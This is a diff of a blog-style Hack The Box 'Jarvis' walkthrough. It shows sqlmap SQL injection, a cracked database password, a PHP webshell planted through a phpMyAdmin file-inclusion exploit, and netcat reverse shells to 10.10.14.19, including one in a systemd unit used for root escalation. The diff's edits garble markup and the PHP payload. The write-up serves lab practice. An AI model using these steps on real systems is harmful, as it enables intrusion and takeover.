@@ -11,7 +11,7 @@ categories: HackTheBox OSCP-Like
 
 We are going to pwn Jarvis from Hack The Box.
 
-Link : <https://www.hackthebox.eu/home/machines/profile/194>
+Link : [https://www.hackthebox.eu/home/machines/profile/194](https://www.hackthebox.eu/home/machines/profile/194)
 
 
 Lets Begin with our Initial Nmap Scan.
@@ -41,10 +41,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## HTTP:
 
-It looks like a normal webpage. So better we try bruteforcing the directories.<br/>
+It looks like a normal webpage. So better we try bruteforcing the directories.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/2.png)
 
-Got some details on the bottom of the page.<br/>
+Got some details on the bottom of the page.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/3.png)
 
 ## Gobuster Result:
@@ -78,11 +78,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-``/phpmyadmin``<br/>
+``/phpmyadmin``[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/4.png)
 Tried with default credentials ``Username: root Password: [null]`` but failed so better we try to enumerate more.
 
-In the webpage clicking on ``Rooms`` it redirects to ``rooms-suites.php`` and by clicking any of those rooms it redirects to ``/room.php`` with a parameter called cod that holds the room number.<br/>
+In the webpage clicking on ``Rooms`` it redirects to ``rooms-suites.php`` and by clicking any of those rooms it redirects to ``/room.php`` with a parameter called cod that holds the room number.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/5.png)
 
 So I started SQLMAP with the url. There is some kind of filter which Ban us for 90 seconds.
@@ -98,29 +98,29 @@ And it give me some payload. It Looks like SQL Injection using UNION is there.
 
 > sqlmap -u http://supersecurehotel.htb/room.php?cod=1 --level 5 --risk 3 --password
 
-Got ``DBadmin`` hash.<br/>
+Got ``DBadmin`` hash.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/9.png)
 
-I cracked that using [CrackStation](https://crackstation.net/)<br/>
+I cracked that using [CrackStation](https://crackstation.net/)[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/10.png)
 
-``/phpmyadmin``<br/>
+``/phpmyadmin``[br/](br/)
 
-``DBadmin:imissyou``<br/>
+``DBadmin:imissyou``[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/11.png)
 
-Found Phpmyadmin's version so search for any exploit available.<br/>
+Found Phpmyadmin's version so search for any exploit available.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/12.png)
 
-><https://www.exploit-db.com/exploits/44928>
+>[https://www.exploit-db.com/exploits/44928](https://www.exploit-db.com/exploits/44928)
 
-According to the exploit we need to inject the payload in SQL Query.<br/>
-```select '<?php system($_GET["cmd"]);?>'```
+According to the exploit we need to inject the payload in SQL Query.[br/](br/)
+```select '[?php system($_GET["cmd"]);?](?php system($_GET["cmd"]);?)'```
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/13.png)
 
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/14.png)
 
-Now we need to get the Session ID of phpMyAdmin.<br/>
+Now we need to get the Session ID of phpMyAdmin.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/15.png)
 
 ``http://supersecurehotel.htb/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_8271hfci8stuji9h69a2huedmt4dt75e&cmd=ls``
@@ -132,14 +132,14 @@ Its working lets try to get reverse shell!
 
 ``nc -e /bin/sh 10.10.14.19 1234``
 
-I got the shell as ``www-data``<br/>
+I got the shell as ``www-data``[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/17.png)
 
 
 I started with ``sudo -l`` and looks like we can run ``simpler.py`` as pepper without password.
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/18.png)
 
-Lets see how ``simpler.py`` works<br/>
+Lets see how ``simpler.py`` works[br/](br/)
 ```
 python simpler.py
 ***********************************************
@@ -205,7 +205,7 @@ pepper
 
 ## Privilege Escalation
 
-Started my enumeration script and found there is a SUID binary.<br/>
+Started my enumeration script and found there is a SUID binary.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/19.png)
 
 I checked [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/), According to that we need to create a service that executes a file of our choice when it enables.
@@ -220,10 +220,10 @@ ExecStart=/bin/sh -c "nc -e /bin/sh 10.10.14.19 5555"
 WantedBy=multi-user.target
 ```
 
-Uploaded the script to the box and gave executable permission. Now we need to link the service first and then enable the service which executes it.<br/>
+Uploaded the script to the box and gave executable permission. Now we need to link the service first and then enable the service which executes it.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/20.png)
 
-Started my listener<br/>
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/21.png) <br/>
+Started my listener[br/](br/)
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jarvis/21.png) [br/](br/)
 I'm Root
 
